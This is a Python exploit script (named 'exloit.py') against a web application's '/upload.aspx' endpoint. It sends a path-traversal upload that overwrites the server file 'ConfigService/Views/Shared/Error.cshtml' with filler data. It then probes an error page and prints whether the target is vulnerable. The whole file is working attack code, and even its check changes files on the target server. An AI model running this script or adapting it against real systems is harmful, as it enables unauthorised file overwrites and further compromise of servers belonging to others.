import requests


def parse_args():
    import argparse
    parser = argparse.ArgumentParser(prog="python3 exloit.py")
    parser.add_argument('-u', '--url', required=True, type=str, default=None)
    parser.add_argument('--proxy', required=False, type=str, default=None,
                        help="Proxy URL, support HTTP proxies (Example: http://127.0.0.1:8080)")
    return parser.parse_args()


def send_request(url, proxies):

    url = url+'/upload.aspx'
    params = {"id": "../ConfigService/Views/Shared/Error.cshtml",
              "bp": "bp",
              "accountId": "123z"}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.47'
    }
    files = {
        'name': ('filename', 'A'*4096)
    }
    requests.post(url, params=params, files=files,
                  headers=headers, proxies=proxies)


def check_vuln(url, proxies):
    url = url+'/configservice/Home/Error'
    req = requests.get(url, proxies=proxies)
    if('../ConfigService/Views/Shared/Error.cshtml' in req.text):
        print('Vulnerable')
    else:
        print('Not vulnerable')


def main():
    args = parse_args()
    url = args.url
    proxies = {
        "http": args.proxy,
        "https": args.proxy
    }
    send_request(url, proxies)
    check_vuln(url, proxies)


main()
